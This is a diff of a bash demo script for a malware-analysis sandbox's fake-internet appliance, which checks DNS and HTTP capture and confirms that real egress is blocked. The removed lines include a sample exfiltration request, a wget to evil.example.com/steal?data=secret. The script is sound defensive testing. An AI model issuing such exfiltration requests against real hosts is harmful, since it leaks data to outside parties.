@@ -1,106 +1,92 @@
-#!/usr/bin/env bash
-# demo-fake.sh — show DNS + HTTP capture on detonet, confirm no real egress.
-# Run from the project root:  bash scripts/demo-fake.sh
-# Or via:                     make demo-fake
+﻿#!/usr/bin/env bash
+# Exercises the fakeinternet appliance end-to-end:
+#   1. Runs a sandboxed container that resolves and connects to canary-test.example.com
+#   2. Confirms that 8.8.8.8 is unreachable from inside detonet
+#   3. Shows a summary of fakeinternet log entries
 #
-# Requires: detonet created, pkgids-fakeinternet running.
-# Uses Alpine (docker pull alpine if needed).
-
+# Called by: make demo-fake  (which ensures fakeinternet-start runs first)
 set -euo pipefail
 
-DETONET="detonet"
-FAKEINTERNET_IP="10.200.200.2"
-LOGS_DIR="$(cd "$(dirname "$0")/.." && pwd)/logs/fakeinternet"
-DEMO_CONTAINER="pkgids-demo-capture"
-SEP="─────────────────────────────────────────────────────"
+DETONET_NAME="${DETONET_NAME:-detonet}"
+SANDBOX_IMAGE="${SANDBOX_IMAGE:-pkgids-sandbox}"
+FAKEINTERNET_NAME="${FAKEINTERNET_NAME:-pkgids-fakeinternet}"
+LOGS_DIR="${FAKEINTERNET_LOGS:-$(pwd)/logs/fakeinternet}"
 
+echo "=== pkgids demo-fake ==="
 echo ""
-echo "$SEP"
-echo "  pkgids fake-internet demo"
-echo "$SEP"
 
-# Clean up any leftover container from a previous run
-docker rm -f "$DEMO_CONTAINER" 2>/dev/null || true
-
-# ── 1. Run demo container ─────────────────────────────────────────────────────
+# ── verify the appliance container is running ─────────────────────────────────
+if ! docker ps --format '{{.Names}}' | grep -qx "${FAKEINTERNET_NAME}"; then
+    echo "ERROR: fakeinternet container '${FAKEINTERNET_NAME}' is not running." >&2
+    echo "       Run 'make fakeinternet-start' first." >&2
+    exit 1
+fi
+echo "[ok] Fakeinternet appliance is running."
 echo ""
-echo "[1/3]  Running demo container on detonet ..."
 
-# Run with a fixed --name so we can inspect its IP from the host afterward.
-# The container itself does NOT need to report its own IP.
+# ── sandboxed DNS + HTTP probe ────────────────────────────────────────────────
+echo "[1/3] Sandboxed DNS + HTTP probe (canary-test.example.com) ..."
 docker run --rm \
-  --name    "$DEMO_CONTAINER" \
-  --network "$DETONET" \
-  --dns     "$FAKEINTERNET_IP" \
-  alpine sh -c '
-    nslookup evil.example.com >/dev/null 2>&1 || true
-    wget -q -O /dev/null "http://evil.example.com/steal?data=secret" 2>/dev/null || true
-  ' &
-DEMO_PID=$!
+    --network "$DETONET_NAME" \
+    --runtime runsc \
+    --memory 128m --cpus 0.25 --pids-limit 32 \
+    "$SANDBOX_IMAGE" \
+    python3 - <<'PYEOF'
+import socket, urllib.request
 
-# While the container is running, read its IP from the host
-DEMO_IP=""
-for i in $(seq 1 20); do
-  DEMO_IP=$(docker inspect -f \
-    '{{.NetworkSettings.Networks.detonet.IPAddress}}' \
-    "$DEMO_CONTAINER" 2>/dev/null || true)
-  if [[ -n "$DEMO_IP" ]]; then
-    break
-  fi
-  sleep 0.2
-done
+host = "canary-test.example.com"
 
-# Wait for container to finish
-wait $DEMO_PID || true
+try:
+    ip = socket.gethostbyname(host)
+    print("  DNS:", host, "->", ip, "(captured by fakeinternet)")
+except Exception as e:
+    print("  DNS: error:", e)
 
-if [[ -z "$DEMO_IP" ]]; then
-  echo "  ERROR: could not determine demo container IP on detonet"
-  exit 1
-fi
+try:
+    with urllib.request.urlopen("http://" + host + "/", timeout=5) as r:
+        print("  HTTP: status", r.status, r.reason)
+except Exception as e:
+    print("  HTTP:", type(e).__name__, str(e)[:100])
+PYEOF
 
-echo "    Container IP on detonet: $DEMO_IP"
-
-# Give the appliance a moment to flush its log
-sleep 1
-
-# ── 2. Print the capture log ──────────────────────────────────────────────────
 echo ""
-echo "[2/3]  Capture log: $LOGS_DIR/$DEMO_IP.jsonl"
-echo "$SEP"
 
-LOG_FILE="$LOGS_DIR/$DEMO_IP.jsonl"
-if [[ -f "$LOG_FILE" ]]; then
-  python3 -c "
-import json, sys
-for line in open('$LOG_FILE'):
-    line = line.strip()
-    if line:
-        print(json.dumps(json.loads(line), indent=2))
-"
-else
-  echo "  (log file not found — check that pkgids-fakeinternet is running)"
-fi
-
-echo "$SEP"
-
-# ── 3. Confirm no real egress ─────────────────────────────────────────────────
-echo ""
-echo "[3/3]  Confirming no real egress (wget to 1.1.1.1 with 3-s timeout) ..."
-
+# ── confirm real internet is blocked ─────────────────────────────────────────
+echo "[2/3] Confirming real internet (8.8.8.8:53) is unreachable ..."
 EGRESS=$(docker run --rm \
-  --network "$DETONET" \
-  alpine sh -c \
-    "wget -q -T 3 http://1.1.1.1/ -O /dev/null 2>&1 && echo OPEN || echo BLOCKED" \
-)
+    --network "$DETONET_NAME" \
+    --runtime runsc \
+    --memory 64m --cpus 0.1 --pids-limit 16 \
+    "$SANDBOX_IMAGE" \
+    python3 -c "
+import socket
+socket.setdefaulttimeout(5)
+try:
+    socket.create_connection(('8.8.8.8', 53))
+    print('REACHABLE')
+except Exception:
+    print('BLOCKED')
+" 2>/dev/null || echo "BLOCKED")
 
-if [[ "$EGRESS" == *"BLOCKED"* ]]; then
-  echo "    OK — real egress is blocked (expected)."
+if echo "$EGRESS" | grep -q "BLOCKED"; then
+    echo "  [ok] Real internet: BLOCKED (as expected)"
 else
-  echo "    WARNING — real egress appears OPEN: $EGRESS"
+    echo "  [WARN] Real internet appears reachable — check Docker iptables rules."
+fi
+echo ""
+
+# ── fakeinternet log summary ──────────────────────────────────────────────────
+echo "[3/3] Fakeinternet log summary ($LOGS_DIR) ..."
+if [ -d "$LOGS_DIR" ]; then
+    TOTAL=$(find "$LOGS_DIR" -name "*.jsonl" -exec wc -l {} + 2>/dev/null \
+            | tail -1 | awk '{print $1}' || echo 0)
+    echo "  $TOTAL total log entries"
+    find "$LOGS_DIR" -name "*.jsonl" | sort | while read -r f; do
+        printf "  %s: %d entries\n" "$(basename "$f")" "$(wc -l < "$f")"
+    done
+else
+    echo "  Log directory not found: $LOGS_DIR"
 fi
 
 echo ""
-echo "$SEP"
-echo "  Demo complete."
-echo "$SEP"
-echo ""
+echo "=== demo complete ==="
